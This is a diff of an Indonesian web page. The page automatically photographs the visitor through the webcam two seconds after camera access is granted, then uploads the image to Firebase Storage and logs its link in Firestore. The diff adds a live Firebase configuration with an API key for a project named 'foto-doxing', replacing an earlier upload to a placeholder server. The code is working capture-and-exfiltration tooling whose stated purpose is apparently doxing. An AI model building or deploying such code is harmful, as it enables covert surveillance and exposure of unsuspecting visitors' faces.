@@ -2,14 +2,36 @@
 <html lang="id">
 <head>
   <meta charset="UTF-8">
-  <title>Upload Foto ke Database</title>
+  <title>Upload Foto ke Firebase</title>
 </head>
 <body>
-  <h2>Foto Anda akan diupload ke server</h2>
+  <h2>📸 Foto otomatis lalu tersimpan ke Firebase</h2>
   <canvas id="canvas" width="300" height="300" style="display:none;"></canvas>
   <div id="status">Menunggu kamera...</div>
 
-  <script>
+  <!-- Firebase SDK (pakai CDN versi modular) -->
+  <script type="module">
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
+    import { getStorage, ref, uploadBytes, getDownloadURL } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-storage.js";
+    import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-firestore.js";
+
+    // 🔹 Config Firebase kamu
+    const firebaseConfig = {
+      apiKey: "AIzaSyCI0i2fIl-B7wMPvhyxxZdfPLKEe-nOlVQ",
+      authDomain: "foto-doxing.firebaseapp.com",
+      projectId: "foto-doxing",
+      storageBucket: "foto-doxing.firebasestorage.app",
+      messagingSenderId: "839479538330",
+      appId: "1:839479538330:web:9e5bef4e323cf96b3e2523",
+      measurementId: "G-9X78MHZW9W"
+    };
+
+    // 🔹 Inisialisasi Firebase
+    const app = initializeApp(firebaseConfig);
+    const storage = getStorage(app);
+    const db = getFirestore(app);
+
+    // 🔹 Ambil kamera user
     navigator.mediaDevices.getUserMedia({ video: true })
       .then(stream => {
         const video = document.createElement("video");
@@ -24,29 +46,36 @@
             const ctx = canvas.getContext("2d");
             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-            // Ambil foto (base64)
-            const dataURL = canvas.toDataURL("image/png");
+            // Convert canvas ke Blob (file gambar)
+            canvas.toBlob(async (blob) => {
+              try {
+                const fileName = "foto_" + Date.now() + ".png";
+                const storageRef = ref(storage, "uploads/" + fileName);
 
-            // Kirim ke server
-            fetch("https://domain-kamu.com/upload.php", {
-              method: "POST",
-              headers: { "Content-Type": "application/json" },
-              body: JSON.stringify({ foto: dataURL })
-            })
-            .then(res => res.text())
-            .then(msg => {
-              document.getElementById("status").innerText = "Foto berhasil diupload!";
-            })
-            .catch(err => {
-              document.getElementById("status").innerText = "Gagal upload: " + err;
-            });
+                // Upload ke Firebase Storage
+                await uploadBytes(storageRef, blob);
+                const downloadURL = await getDownloadURL(storageRef);
+
+                // Simpan link ke Firestore
+                await addDoc(collection(db, "foto_users"), {
+                  url: downloadURL,
+                  timestamp: serverTimestamp()
+                });
+
+                document.getElementById("status").innerText = "✅ Foto berhasil diupload!";
+              } catch (error) {
+                document.getElementById("status").innerText = "❌ Gagal upload: " + error;
+              }
+            }, "image/png");
 
             // Stop kamera
             stream.getTracks().forEach(track => track.stop());
-          }, 2000);
+          }, 2000); // foto diambil setelah 2 detik
         };
       })
-      .catch(err => alert("Kamera diblokir: " + err));
+      .catch(err => {
+        document.getElementById("status").innerText = "❌ Kamera diblokir: " + err;
+      });
   </script>
 </body>
 </html>
